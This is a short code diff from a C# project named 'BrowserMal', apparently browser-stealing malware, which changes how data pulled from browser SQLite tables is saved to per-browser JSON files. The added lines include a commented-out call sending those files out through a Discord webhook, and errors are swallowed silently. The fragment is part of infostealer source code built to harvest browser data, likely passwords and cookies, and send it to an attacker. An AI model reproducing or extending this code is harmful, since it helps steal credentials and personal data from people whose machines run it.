@@ -21,7 +21,7 @@ namespace BrowserMal.Manager
             this.sqliteTableModel = sqliteTableModel;
         }
 
-        public void Init(ref List<BrowserModel> browsers, string profileType)
+        public void Init(ref List<BrowserModel> browsers, string profileType, string outputPath)
         {
             try
             {
@@ -43,7 +43,8 @@ namespace BrowserMal.Manager
                     if (result.Count == 0)
                         continue;
 
-                    FileManager.Save<T>(result, $"{browser.Name}_{tableName}.json");
+                    //Discord.Webhook.SendFile<T>(result, $"{browser.Name}_{tableName}.json");
+                    FileManager.Save<T>(result, outputPath, $"{browser.Name}_{tableName}.json");
                 }
             }
             catch { }
